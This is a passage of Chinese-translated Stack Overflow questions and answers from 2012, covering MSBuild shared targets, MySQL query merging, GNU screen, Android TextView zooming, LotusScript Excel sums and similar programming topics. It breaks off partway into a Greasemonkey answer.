> 时间：2012-04-20T03:34:28.570
> 
> 标签：msbuild

我有一个 AfterBuild 目标，我想将它用于解决方案中的多个项目。有没有办法可以将该目标放入 .targets 文件并在每个项目中引用该文件。

以下是我尝试过的，似乎不起作用。

项目文件：

```
<Import Project="..\debug.targets"/> 
```

.目标文件：

```
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target Name="AfterBuild">
    <PropertyGroup>
        <WebsiteDirectory>C:\Inetpub\wwwroot</WebsiteDirectory>
    </PropertyGroup>

    <ItemGroup>
        <output Include=".\**\*.dll" Exclude=".\**\obj\**" />
        <output Include=".\**\*.pdb" Exclude=".\**\obj\**" />
        <output Include=".\**\*.svc" />
        <output Include=".\**\*.xap" />
        <output Include=".\**\*.aspx" />
        <output Include=".\**\*.js" />
        <output Include=".\**\*.config" />
    </ItemGroup>

    <PropertyGroup>
        <VirtualDirectoryPath>$(WebsiteDirectory)\$(RootNamespace)</VirtualDirectoryPath>
    </PropertyGroup>

    <copy SourceFiles="@(output)" DestinationFiles="@(output->'$(VirtualDirectoryPath)\%(RecursiveDir)%(Filename)%(Extension)')" />
</Target> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-27T13:08:35.493

用这个

```
<Import Project="$(MSBuildThisFileDirectory)\debug.targets"/> 
```

`$(MSBuildThisFile)`= 当前项目文件。
`$(MSBuildThisFileDirectory)`= 包含当前项目文件的目录。

项目文件中的相对路径很难使用，具体取决于调用项目文件的内容。直接使用 msbuild，相对路径将解析为项目文件。使用VS，相对路径将使用解决方案文件作为基本路径。

使用`$(MSBuildThisFileDirectory)`将强制相对路径使用预先确定的起始路径。您需要做的就是填写相对路径的其余部分。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T03:44:34.710

您所做的基本上是正确的，但请确保您的 Import 语句是项目文件中的最后一个 Import。

要验证目标是否被正确调用，请从命令行以诊断模式运行 msbuild，并记下有关目标的输出。

> msbuild myproj.proj /v:diag

# php - 在不使用 UNION ALL 的情况下将两个查询合并为一个

> ID：10239874
> 
> 赞同：3
> 
> 时间：2012-04-20T03:34:38.203
> 
> 标签：php, mysql

我有以下两个 mysql 查询，我正在尝试将它们合并为一个。

查询一：

```
$getData = $this->db->query("SELECT *,accounts.name AS DebitAccountName ,debit_side.amount AS DebitAmount
    FROM credit_side
    LEFT JOIN debit_side ON debit_side.transaction_id_dr = credit_side.transaction_id_cr
    LEFT JOIN transaction_info ON transaction_info.transaction_id = credit_side.transaction_id_cr
    LEFT JOIN accounts ON accounts.code = credit_side.account_code 
    WHERE debit_side.account_code='1001'"); 
```

查询 2：

```
 $getData = $this->db->query(SELECT *,accounts.name AS CreditAccountName,credit_side.amount AS CreditAmount
    FROM debit_side
    LEFT JOIN credit_side ON debit_side.transaction_id_dr = credit_side.transaction_id_cr
    LEFT JOIN transaction_info ON transaction_info.transaction_id = debit_side.transaction_id_dr
    LEFT JOIN accounts ON accounts.code = debit_side.account_code 
    WHERE credit_side.account_code='1001'"); 
```

我已经尝试过 UNION ALL 但这实际上在这种情况下不起作用，问题是当我回`$DebitAccountName`显它时`$CreditAccountName`也会显示我不想要的结果。

我正在使用 Codeigniter，在我的视图文件中，我的目标是回显这样的结果。

```
 <?php if(count($records) > 0) { ?>

<?php foreach ($records as $row){ ?>

<?php echo $row['DebitAccountName']; ?> 
  <?php echo $row['DebitAmount']; ?>

<?php echo $row['CreditAccountName']; ?> 
  <?php echo $row['CreditAmount']; ?> 
```

请您帮我把这两个查询合二为一吗？

提前致谢 ：）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-23T09:14:48.237

我结合了这些查询

```
 $data   =   array(
                  'debit_side.account_code    Code',
                  'group_concat(distinct accounts.name) as DebitAccount',
                  'group_concat(debit_side.amount) as DebitAmount',
                  'group_concat(transaction_info.voucher_date) as DebitVoucherDate',
                  '(SELECT group_concat(distinct accounts.name) as CreditAccount FROM (accounts)
                    left JOIN debit_side ON accounts.code = debit_side.account_code
                    left JOIN credit_side ON debit_side.transaction_id_dr = credit_side.transaction_id_cr
                    left JOIN transaction_info ON transaction_info.transaction_id = credit_side.transaction_id_cr
                    group by credit_side.account_code
                    having credit_side.account_code = `Code`) as CreditAccount',
                  '(SELECT  group_concat(credit_side.amount) as CreditAmount FROM (accounts)
                     left JOIN debit_side ON accounts.code = debit_side.account_code
                     left JOIN credit_side ON debit_side.transaction_id_dr = credit_side.transaction_id_cr
                     left JOIN transaction_info ON transaction_info.transaction_id = credit_side.transaction_id_cr
                   group by credit_side.account_code
                   having credit_side.account_code = `Code`) as CreditAmount',  
                  '(SELECT  group_concat(transaction_info.voucher_date) as CreditVoucherDate FROM (accounts)
                    left JOIN debit_side ON accounts.code = debit_side.account_code
                    left JOIN credit_side ON debit_side.transaction_id_dr = credit_side.transaction_id_cr
                    left JOIN transaction_info ON transaction_info.transaction_id = credit_side.transaction_id_cr
                    group by credit_side.account_code
                    having credit_side.account_code = `Code`) as CreditVoucherDate'

                );
    $this->db->select($data);
    $this->db->from('accounts');
    $this->db->join('credit_side','accounts.code = credit_side.account_code','left');
    $this->db->join('debit_side','debit_side.transaction_id_dr = credit_side.transaction_id_cr','left');
    $this->db->join('transaction_info','transaction_info.transaction_id = credit_side.transaction_id_cr','left');
    $this->db->group_by('debit_side.account_code');
    $this->db->order_by('debit_side.account_code','ASC');
    $query  =   $this->db->get();
    return  $query->result_array(); 
```

也可以在这里查看编辑

[如何使用 PHP Mysql 创建总帐/T-Account](https://stackoverflow.com/questions/10191481/how-to-create-general-ledger-t-account-using-php-mysql/10193343#10193343)

好吧，感谢@vyegorov，这是此查询的修改和优化版本

[Group by 在查询中的奇怪行为需要优化](https://stackoverflow.com/questions/10518718/strange-behaviour-of-group-by-in-query-which-needs-to-be-optimized/10533100#10533100)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T04:19:13.243

为简单起见，我省略了 transaction_info JOIN：

```
SELECT debacc.name AS DebitAccountName, debit_side.amount AS DebitAmount,
    credacc.name AS CreditAccountName, credit_side.amount AS CreditAmount
FROM debit_side
LEFT JOIN credit_side ON debit_side.transaction_id_dr = credit_side.transaction_id_cr
LEFT JOIN accounts credacc ON credacc.code = credit_side.account_code
LEFT JOIN accounts debacc ON debacc.code = debit_side.account_code
WHERE debit_side.account_code='1001' 
```

此查询引用帐户表两次，一次用于借方，一次用于贷方。这使您可以显示交易双方的信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T03:44:57.670

为什么不从两个表（debit_side 和 credit_side）中使用 SELECT？当然，每个表都需要所有 JOIN。

# java - 使用命令启动屏幕

> ID：10239879
> 
> 赞同：0
> 
> 时间：2012-04-20T03:35:07.193
> 
> 标签：java, gnu-screen, minecraft

我需要能够在不连接屏幕的情况下启动屏幕，但它还需要运行我的 start.sh 脚本，其中包含启动 Minecraft 的 java 行。

```
screen -d -m new3 -c start.sh 
```

是我一直在尝试使用的，但它从未运行 start.sh

在我在网上找到的一段代码中，它似乎可以做我想做的事，但我需要一些帮助

```
 mc_start() {
    cd $MCPATH
    as_user "cd $MCPATH && screen -dmS $SCREEN $INVOCATION"
    #
    # Waiting for the server to start
    #
    seconds=0
    until ps ax | grep -v grep | grep -v -i SCREEN | grep $SERVICE > /dev/null
    do
        sleep 1 
        seconds=$seconds+1
        if [[ $seconds -eq 5 ]]
        then
            echo "Still not running, waiting a while longer..."
        fi
        if [[ $seconds -ge 120 ]]
        then
            echo "Failed to start, aborting."
            exit 1
        fi
    done    
    echo "$SERVICE is running."
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T03:38:09.503

我认为这是因为你的命令是错误的。我假设您要创建一个名为的新会话`new3`并从中分离

```
screen -d -m -S new3 ~/start.sh 
```

之后，您可以运行以下命令连接回您的会话。

```
screen -R new3 
```

# html - IE9 在开始从 Amazon S3 流式传输视频之前等待 7-10 秒

> ID：10239882
> 
> 赞同：0
> 
> 时间：2012-04-20T03:35:31.020
> 
> 标签：html, amazon-s3, internet-explorer-9, video-streaming

[http://screencast.com/t/NKb9erVyd0](http://screencast.com/t/NKb9erVyd0)

我正在使用 Projekktor HTML5 视频播放器。视频立即开始在所有浏览器中播放，除了 Internet Explorer。在开发人员工具中，IE 显示了巨大的等待时间。这个等待时间是多少？为什么 IE 觉得有必要浪费我用户生命的 10 秒？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T03:59:56.493

该 MP4 在文件末尾有索引，因此 Internet Explorer 会在开始播放之前下载整个文件。我不知道为什么会这样，但您可以在 MP4 上运行 QTIndexSwapper 来解决问题。

[http://renaun.com/blog/code/qtindexswapper/](http://renaun.com/blog/code/qtindexswapper/)

# vba - 使用lotusscript计算excel中单元格的总和

> ID：10239885
> 
> 赞同：0
> 
> 时间：2012-04-20T03:35:41.280
> 
> 标签：vba, excel

我有一个表格，在表格中我有一个包含 excel 文件的对象（工作表）。然后我有一个按钮可以计算工作表中字段的总和，并在表单的字段中显示它的总和。我该如何编码？想法是这样的

总计 = 总和 (A2:A51)

doc.total = totalr

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-08T22:27:04.557

如果您在将要从 Notes 客户端使用的表单上执行此操作，并且运行 Notes 客户端的计算机具有 Excel，那么您可以使用 VBA。只需将文件提取到用户的硬盘驱动器，用 Excel 打开它，在列底部添加一个单元格并在那里放置一个 SUM() 函数，获取该新单元格的值，更新 UIDOC 中的字段，然后擦除临时文件。

下面的代码假定您有一个表单，其中包含一个名为“excelfile”的 RichText 字段（包含 Excel 文件）、一个名为“Sum”的字段，该字段将包含 Excel 文件中的总和值，以及一个包含代码的按钮。此外，必须将文档与附件一起保存，代码才能正常工作。

希望能帮助到你。

```
Sub Click(Source As Button)

On Error Goto errorhandler

Dim s As New NotesSession
Dim ws As New NotesUIWorkspace
Dim uidoc As NotesUIDocument
Set uidoc = ws.CurrentDocument
Dim doc As NotesDocument
Set doc = uidoc.Document
Dim rtitem As NotesRichTextItem
Dim isfileopen As Boolean

Dim filename As String, rows As Double, cols As Double, colToSum As String, c As Integer
Dim xlApp As Variant, xlWorkbook As Variant, xlSheet As Variant, pathname As String

isfileopen = False

'convert column letter to number
colToSum = "A"
c = Asc(colToSum) - 64

'extract file
pathname = s.GetEnvironmentString( "Directory", True ) & "\"
Set rtitem = doc.GetFirstItem("excelfile")
If Not (doc.HasEmbedded) Then
    Msgbox "There are no file attachments on this document"
    Goto ExitGracefully
End If  
Forall o In rtitem.EmbeddedObjects
    If ( o.Type = EMBED_ATTACHMENT ) Then
        filename = pathname & o.Name            
        Call o.ExtractFile( filename )          
    End If
End Forall

'open file
Print "Opening file " & filename & "..."
Set xlApp = CreateObject("Excel.Application") 
xlApp.Workbooks.Open filename
isfileopen = True

'get sheet
Print "Gathering data ..."
Set xlWorkBook = xlApp.ActiveWorkbook 
Set xlSheet = xlWorkBook.ActiveSheet 
xlSheet.Cells.SpecialCells(11).Activate
rows = xlApp.ActiveWindow.ActiveCell.Row 
cols = xlApp.ActiveWindow.ActiveCell.Column 

'add a row and put the sum() formula there
Print "Computing sum with Excel..."
xlSheet.Cells( rows+1, c ).value = "=SUM(" & colToSum & "1:" & colToSum & Cstr(rows) & ")"

'update UI doc
Call uidoc.FieldSetText( "Sum", Cstr(xlSheet.Cells( rows+1, c ).value) )

exitgracefully:

'close excel
Print "Closing Excel..."
If Not xlWorkbook Is Nothing Then
    xlWorkbook.Close False 
End If
If Not xlApp Is Nothing Then
    xlApp.DisplayAlerts = False
    xlApp.Quit
    Set xlApp = Nothing 
End If 

If isfileopen Then
    'remove temp file
    Print "Removing " & filename
    Kill filename
End If

'done
Print "Done"

Exit Sub
errorhandler:
Msgbox Error & " line " & Erl
Exit Sub
End Sub 
```

# database-design - 使用外键或保留交易历史信息的数据？

> ID：10239888
> 
> 赞同：0
> 
> 时间：2012-04-20T03:35:52.650
> 
> 标签：database-design, relational-database, database-schema

这是一个场景。

您有一个向客户销售的电子商务网站。显然有交易，例如，对于每笔销售，您都会记录有关销售的信息。所以让我们有一个“购买”表。它应该有哪些列？

1）它应该只有一个使用'customer_id'的'customer'表的外键吗？或 2) 保留快照，例如“customer_name”、“customer_address”...都为 VARCHAR(x) 或 3) 两者或 4) 将“购买”表分成多个表？或者是其他东西。

请给出你的意见和理由。干杯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T11:56:41.933

关于“购买”表应该包含的列，这在很大程度上取决于您的要求。通常，您至少会有某种购买代码、购买日期和购买客户，以及购买中的物品列表（单独的表格）。

关于您提到的选项，我猜您这里有一个关系数据库并且没有选择 NoSQL 解决方案。

在那种情况下，我会放弃选项（2）。它不太适合关系模式，因为您可能会在多条记录中复制客户信息。出于同样的原因，我也会放弃选项（3）。

选项 (1) 更适合关系数据库方法。您将进行购买，每个购买都与自己的客户相关联。这让你很容易知道：

*   给定客户进行了哪些购买。
*   哪个客户进行了具体购买。
*   根据某些标准给定的客户进行购买搜索。
*   根据某些标准给出的购买进行客户搜索。
*   等等

如果您需要能够在给定日期记录客户数据，您总是可以选择创建客户历史记录表并将其链接到客户表。给定购买日期，您就可以知道购买时哪些客户数据是“活跃的”。

关于选项（4），我不知道您的意思，所以我无法回答。

高温高压

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:09:08.350

如果时间是您的问题域的一个固有概念 - 对于电子商务，它也是 - 您也应该将其视为架构中的一流设计概念。

我的首选选项是在可以随时间变化的表格上设置“有效期”指示器。例如，客户表可能如下所示：

```
CUSTOMER
---------------
CustomerID   pk
RecordVersion pk
Name
EmailAddress
HomeAddressID fk
HomeAddressRecordVersion fk
ValidFrom
ValidUntil 
```

然后，“purchases”表通过指定 customerID 和 RecordVersion 列连接到 customers 表。这样，如果您想查看客户在下订单时使用的电子邮件地址，您可以从客户表中检索该数据。

您将知道客户使用的其他电子邮件地址，不仅因为您可以在某些购买数据中找到它，还因为它是您客户记录的一部分。

这个模型可能会变得非常复杂，并且难以查询 - 所以要谨慎使用它。但特别是对于产品、价格、折扣、送货地址等来说，它非常有用，尤其是。在电子商务解决方案中。

# php - 在 IE 中的 rmdir 之后 mkdir 不工作

> ID：10239890
> 
> 赞同：0
> 
> 时间：2012-04-20T03:35:53.937
> 
> 标签：php

我在 IE9 中遇到了一个奇怪的 mkdir 问题。

我似乎能够使用检查和创建文件夹

```
$temp_main_folder = session_id();
if(!is_dir($temp_main_folder)){ 
    mkdir($temp_main_folder . "/", 0755);
} 
```

并使用 unlink 和 rmdir 删除文件夹和文件夹内的所有文件。

这每次都适用于 Firefox、Chrome、Safari。问题是我第一次在 IE 中运行 mkdir 时它可以工作。我第一次在 IE 中运行 rmdir 就可以了。但是，下次我尝试在 IE 中运行 mkdir 时没有任何反应。没有错误，我可以看到文件夹被删除。我必须重新启动 IE 才能让它再次工作。

我正在使用 Apache 2 网络服务器运行 Windows。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:45:44.267

浏览器无法影响 php，因为它的服务器端..

浏览器唯一能做出的效果可以通过查看 `session_id()`功能来决定..

一个疯狂的猜测可能就是没有发送获取会话 ID 所需的 cookie。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T03:48:48.890

谢谢大家，但问题是 IE 正在缓存 mkdir 请求，所以当我检查该文件夹是否存在时，IE 仍然认为它确实存在！

# android - 如何在android中缩放文本视图？

> ID：10239891
> 
> 赞同：6
> 
> 时间：2012-04-20T03:35:54.777
> 
> 标签：android, view, zooming, android-imageview, textview

谁能指导我在android中的多个视图上执行放大和缩小操作？我需要对图像、文本视图的触摸执行放大和缩小操作。我的父布局应该是什么？这是在触摸 imageview 时缩放图像的代码。如何缩放文本视图？请帮我。

```
 // These matrices will be used to scale points of the image
Matrix matrix = new Matrix();
Matrix savedMatrix = new Matrix();

// The 3 states (events) which the user is trying to perform   
static final int NONE = 0;
static final int DRAG = 1;
static final int ZOOM = 2;
int mode = NONE;

// these PointF objects are used to record the point(s) the user is touching
PointF start = new PointF();
PointF mid = new PointF();
float oldDist = 1f;

private void zoom(View v, MotionEvent event) 
{
    ImageView view = (ImageView) v;
    view.setScaleType(ImageView.ScaleType.MATRIX);
    float scale;

    //  dumpEvent(event);
    // Handle touch events here...

    switch (event.getAction() & MotionEvent.ACTION_MASK) 
    {
    case MotionEvent.ACTION_DOWN:  
        // first finger down only
        savedMatrix.set(matrix);
        start.set(event.getX(), event.getY());

        mode = DRAG;
        break;

    case MotionEvent.ACTION_UP: // first finger lifted

    case MotionEvent.ACTION_POINTER_UP: // second finger lifted

        mode = NONE;   

        break;

    case MotionEvent.ACTION_POINTER_DOWN: // first and second finger down

        oldDist = spacing(event);

        if (oldDist > 5f)
        {
            savedMatrix.set(matrix);
            midPoint(mid, event);
            mode = ZOOM;

        }
        break;

    case MotionEvent.ACTION_MOVE:

        if (mode == DRAG) 
        { 
            matrix.set(savedMatrix);
            matrix.postTranslate(event.getX() - start.x, event.getY() - start.y); // create the transformation in the matrix  of points
        } 
        else if (mode == ZOOM) 
        { 
            // pinch zooming
            float newDist = spacing(event);

            if (newDist > 5f) 
            {
                matrix.set(savedMatrix);
                scale = newDist / oldDist; // setting the scaling of the
                // matrix...if scale > 1 means
                // zoom in...if scale < 1 means
                // zoom out
                matrix.postScale(scale, scale, mid.x, mid.y);
            }
        }
        break;  
    }

    view.setImageMatrix(matrix); // display the transformation on screen

}

/*
 * --------------------------------------------------------------------------
 * Method: spacing Parameters: MotionEvent Returns: float Description:
 * 
 * checks the spacing between the two fingers on touch
 * ----------------------------------------------------
 */

private float spacing(MotionEvent event) 
{
    float x = event.getX(0) - event.getX(1);
    float y = event.getY(0) - event.getY(1);
    return FloatMath.sqrt(x * x + y * y);
}

/*
 * --------------------------------------------------------------------------
 * Method: midPoint Parameters: PointF object, MotionEvent Returns: void
 * Description: calculates the midpoint between the two fingers
 * ------------------------------------------------------------
 */   

private void midPoint(PointF point, MotionEvent event) 
{
    float x = event.getX(0) + event.getX(1);
    float y = event.getY(0) + event.getY(1);
    point.set(x / 2, y / 2);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T03:40:40.533

以上是可以的，但你如下：

在 oncreate() 中，您必须初始化您的 textview 并在其上设置 ontouch 事件，如下所示

```
TextView tv = (TextView)findViewById(R.id.name);
tv.setText("text");
tv.setOnTouchListener(this); 
```

这是完整的代码，包括您的代码:::

```
public class MyTextView extends Activity implements OnTouchListener{
     private static final String TAG = "Touch";
        @SuppressWarnings("unused")
        private static final float MIN_ZOOM = 1f,MAX_ZOOM = 1f;

        // These matrices will be used to scale points of the image
        Matrix matrix = new Matrix();
        Matrix savedMatrix = new Matrix();

        // The 3 states (events) which the user is trying to perform
        static final int NONE = 0;
        static final int DRAG = 1;
        static final int ZOOM = 2;
        int mode = NONE;

        // these PointF objects are used to record the point(s) the user is touching
        PointF start = new PointF();
        PointF mid = new PointF();
        float oldDist = 1f;
@Override
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    TextView iv = new TextView(this);
    iv.setText("text");
    iv.setOnTouchListener(this);
    setContentView(iv);
}
@Override
public boolean onTouch(View v, MotionEvent event) {
    // TODO Auto-generated method stub
     ImageView view = (ImageView) v;
     view.setScaleType(ImageView.ScaleType.MATRIX);
     float scale;

     dumpEvent(event);
     // Handle touch events here...

     switch (event.getAction() & 255) 
     {
         case MotionEvent.ACTION_DOWN:   // first finger down only
                                             savedMatrix.set(matrix);
                                             start.set(event.getX(), event.getY());
                                             Log.d(TAG, "mode=DRAG"); // write to LogCat
                                             mode = DRAG;
                                             break;

         case MotionEvent.ACTION_UP: // first finger lifted

         case 6: // second finger lifted

                                             mode = NONE;
                                             Log.d(TAG, "mode=NONE");
                                             break;

         case 5: // first and second finger down

                                             oldDist = spacing(event);
                                             Log.d(TAG, "oldDist=" + oldDist);
                                             if (oldDist > 5f) {
                                                 savedMatrix.set(matrix);
                                                 midPoint(mid, event);
                                                 mode = ZOOM;
                                                 Log.d(TAG, "mode=ZOOM");
                                             }
                                             break;

         case MotionEvent.ACTION_MOVE:

                                             if (mode == DRAG) 
                                             { 
                                                 matrix.set(savedMatrix);
                                                 matrix.postTranslate(event.getX() - start.x, event.getY() - start.y); // create the transformation in the matrix  of points
                                             } 
                                             else if (mode == ZOOM) 
                                             { 
                                                 // pinch zooming
                                                 float newDist = spacing(event);
                                                 Log.d(TAG, "newDist=" + newDist);
                                                 if (newDist > 5f) 
                                                 {
                                                     matrix.set(savedMatrix);
                                                     scale = newDist / oldDist; // setting the scaling of the
                                                                                 // matrix...if scale > 1 means
                                                                                 // zoom in...if scale < 1 means
                                                                                 // zoom out
                                                     matrix.postScale(scale, scale, mid.x, mid.y);
                                                 }
                                             }
                                             break;
     }

     view.setImageMatrix(matrix); // display the transformation on screen

     return true; // indicate event was handled
}
private float spacing(MotionEvent event) 
{
    float x = event.getX(0) - event.getX(1);
    float y = event.getY(0) - event.getY(1);
    return FloatMath.sqrt(x * x + y * y);
}

/*
 * --------------------------------------------------------------------------
 * Method: midPoint Parameters: PointF object, MotionEvent Returns: void
 * Description: calculates the midpoint between the two fingers
 * ------------------------------------------------------------
 */

private void midPoint(PointF point, MotionEvent event) 
{
    float x = event.getX(0) + event.getX(1);
    float y = event.getY(0) + event.getY(1);
    point.set(x / 2, y / 2);
}

/** Show an event in the LogCat view, for debugging */
private void dumpEvent(MotionEvent event) 
{
    String names[] = { "DOWN", "UP", "MOVE", "CANCEL", "OUTSIDE","POINTER_DOWN", "POINTER_UP", "7?", "8?", "9?" };
    StringBuilder sb = new StringBuilder();
    int action = event.getAction();
    int actionCode = action & MotionEvent.ACTION_MASK;
    sb.append("event ACTION_").append(names[actionCode]);

    if (actionCode == MotionEvent.ACTION_POINTER_DOWN || actionCode == MotionEvent.ACTION_POINTER_UP) 
    {
        sb.append("(pid ").append(action >> MotionEvent.ACTION_POINTER_ID_SHIFT);
        sb.append(")");
    }

    sb.append("[");
    for (int i = 0; i < event.getPointerCount(); i++) 
    {
        sb.append("#").append(i);
        sb.append("(pid ").append(event.getPointerId(i));
        sb.append(")=").append((int) event.getX(i));
        sb.append(",").append((int) event.getY(i));
        if (i + 1 < event.getPointerCount())
            sb.append(";");
    }

    sb.append("]");
    Log.d("Touch Events ---------", sb.toString());
}
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T04:29:00.703

要缩放 textview，您可以使用与缩放图像相同的代码。但是您应该将 textview 更改为 imageview，然后执行缩放操作。这是将 textview 转换为 imageview 的[链接](https://stackoverflow.com/questions/4167593/converting-a-textview-bitmap-imageview-and-nothings-showing-up)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-04-24T12:46:39.290

我找到了一个非常简单的解决方案来实现文本视图的放大/缩小。也许它可以帮助某人

```
package com.app;

import android.os.Bundle;
import android.util.TypedValue;
import android.view.MotionEvent;
import android.widget.TextView;
import android.support.v7.app.AppCompatActivity;
import android.view.View;

public class MyActivity extends AppCompatActivity implements View.OnTouchListener{

    public static final int TEXT_MAX_SIZE = 140;
    public static final int TEXT_MIN_SIZE = 40;
    private static final int STEP = 4;

    private int mBaseDistZoomIn;
    private int mBaseDistZoomOut;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.my_activity);

        .
        .
        .
        TextView viewById = (TextView) findViewById(R.id.some_text_view);
        viewById.setOnTouchListener(this);
    }

    @Override
    public boolean onTouch(View v, MotionEvent event) {
        if (event.getPointerCount() == 2) {
            TextView viewById = (TextView) findViewById(R.id.some_text_view);
            int action = event.getAction();
            int pure = action & MotionEvent.ACTION_MASK;

            if (pure == MotionEvent.ACTION_POINTER_DOWN
                    && viewById.getTextSize() <= TEXT_MAX_SIZE
                    && viewById.getTextSize() >= TEXT_MIN_SIZE) {

                mBaseDistZoomIn = getDistanceFromEvent(event);
                mBaseDistZoomOut = getDistanceFromEvent(event);

            } else {
                int currentDistance = getDistanceFromEvent(event);
                if (currentDistance > mBaseDistZoomIn) {
                    float finalSize = viewById.getTextSize() + STEP;
                    if (finalSize > TEXT_MAX_SIZE) {
                        finalSize = TEXT_MAX_SIZE;
                    }
                    viewById.setTextSize(TypedValue.COMPLEX_UNIT_PX, finalSize);
                } else {
                    if (currentDistance < mBaseDistZoomOut) {
                        float finalSize = viewById.getTextSize() - STEP;
                        if (finalSize < TEXT_MIN_SIZE) {
                            finalSize = TEXT_MIN_SIZE;
                        }
                        viewById.setTextSize(TypedValue.COMPLEX_UNIT_PX, finalSize);
                    }
                }
            }
            return true;
        }
        return false;
    }

    // good function to get the distance between the multiple touch
    int getDistanceFromEvent(MotionEvent event) {
        int dx = (int) (event.getX(0) - event.getX(1));
        int dy = (int) (event.getY(0) - event.getY(1));
        return (int) (Math.sqrt(dx * dx + dy * dy));
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-09-16T12:23:47.090

```
first you should convert Textview to imageview.Next you should apply sample image view drag functionality.
    -----------------------------

            TextView tv = new TextView(this);
            FrameLayout.LayoutParams layoutParams = new FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.FILL_PARENT,
                    FrameLayout.LayoutParams.FILL_PARENT);

            tv.setLayoutParams(layoutParams);
            tv.setText("Text");
            tv.setTextColor(Color.BLACK);
            tv.setBackgroundColor(Color.TRANSPARENT);

            Bitmap testB;

            testB = Bitmap.createBitmap(80, 100, Bitmap.Config.ARGB_8888);
            Canvas c = new Canvas(testB);
            tv.layout(30, 40, 200, 100);
            tv.draw(c);

            ImageView iv = (ImageView) findViewById(R.id.imageView);
            iv.setLayoutParams(layoutParams);
            iv.setBackgroundColor(Color.GRAY);`enter code here`
            iv.setImageBitmap(testB);
            iv.setMaxHeight(80);
            iv.setMaxWidth(200);

            iv.setOnTouchListener(this); 
```

# ruby - 为什么以这种方式命名“排序块”的参数？

> ID：10239892
> 
> 赞同：0
> 
> 时间：2012-04-20T03:36:06.597
> 
> 标签：ruby, arrays, sorting

我的理解是，当引用数组中的数据时，计数从零开始。例如，中的第零个对象`array = ["cat", "dog", "fish"]`是`"cat"`。

我正在编写的教程说要这样做（例如，假设我们按字符串的长度排序）。

```
array.sort {|value1,value2| value1.length <=> value2.length } 
```

这*确实*按我想要的方式排序，但我的问题是，如果数组中的计数从“0”开始，我们为什么不这样做：

```
array.sort {|value0,value1| value0.length <=> value1.length } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T03:39:34.153

`value1`并且`value2`只是数组中每对值的名称或占位符。你可以放另一个你喜欢的：

```
array.sort {|a,b| a.length <=> b.length } 
```

# iphone - 在构建和提交到应用商店期间使用代码签名有什么区别？

> ID：10239893
> 
> 赞同：4
> 
> 时间：2012-04-20T03:36:13.420
> 
> 标签：iphone, ios, xcode, ipad, app-store

提交app到appstore时，有两次需要选择code sign，例如

1.  在代码构建期间
2.  上传期间

有什么区别？如果我在 1 和 2 期间选择两个不同的代码符号怎么办

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T03:53:48.153

第一次 xcode 将验证您的分发证书。第二次有点棘手，如果你是上传应用程序，当然你必须使用分发协同设计，但如果你是为 Ad Hoc 构建，你可以选择开发者证书或分发证书，但问题是设备如果您使用开发人员证书构建应用程序，则您在分发配置文件中添加的无法安装此应用程序。

# java - 使用文件路径在图库中打开图像

> ID：10239897
> 
> 赞同：5
> 
> 时间：2012-04-20T03:36:40.440
> 
> 标签：java, android, eclipse

我的数据库中存储了一个图像文件路径。现在使用它我想在我的画廊中打开 SD 卡中的图像。我怎样才能做到这一点。我已经看到了 Uri 的方法并使用了这个方法，但是我收到了错误

```
File file = new File(filename);
            Uri uri = Uri.fromFile(file);
            Intent intent = new Intent(Intent.ACTION_VIEW, uri);
            intent.setType("image/*");
            startActivity(intent); /** replace with your own uri */ 
```

怎么修，

```
04-20 08:42:23.516: E/AndroidRuntime(16815): android.content.ActivityNotFoundException: No Activity found to handle Intent { act=android.intent.action.VIEW dat=file:///mnt/sdcard/My%20App/image_umxto_1.jpg } 
```

最好的祝福

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-04-20T04:15:06.147

```
Intent intent = new Intent();
            intent.setAction(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(new File(filename)), "image/*");
            startActivity(intent); 
```

使用此代码并告诉我

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T03:43:47.067

您还可以使用以下代码:::

```
Intent intent = new Intent();
intent.setAction(Intent.ACTION_VIEW);
intent.setDataAndType(Uri.parse("file://" + "/sdcard/test.jpg"), "image/*");
startActivity(intent); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T03:42:39.127

您可以使用以下行来完成您的任务:::

```
startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("content://media/external/images/media/16"))); /** replace with your own uri */ 
```

# javascript - 使用 Greasemonkey 编辑具有特定 id 值的 URL

> ID：10239898
> 
> 赞同：0
> 
> 时间：2012-04-20T03:36:40.753
> 
> 标签：javascript, url, greasemonkey

我在一个网站上有许多链接，并且我想编辑一个链接的 URI。一个特定链接具有特定的 id="foo" 值，将其与所有其他链接区分开来 - 页面上只有一个具有该特定 id 值的链接。

我只想将 uri 从（例如：）[http://example.com/](http://example.com/) 更改为 [http://example.com/foo/](http://example.com/foo/)

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T04:06:56.243

您需要提供更多详细信息。而且，指向目标页面的链接是个好主意。

根据目前提供的信息，下面是一个简单的脚本，演示如何更改链接 URL：

```
// ==UserScript==
// @name     _Change a specific link
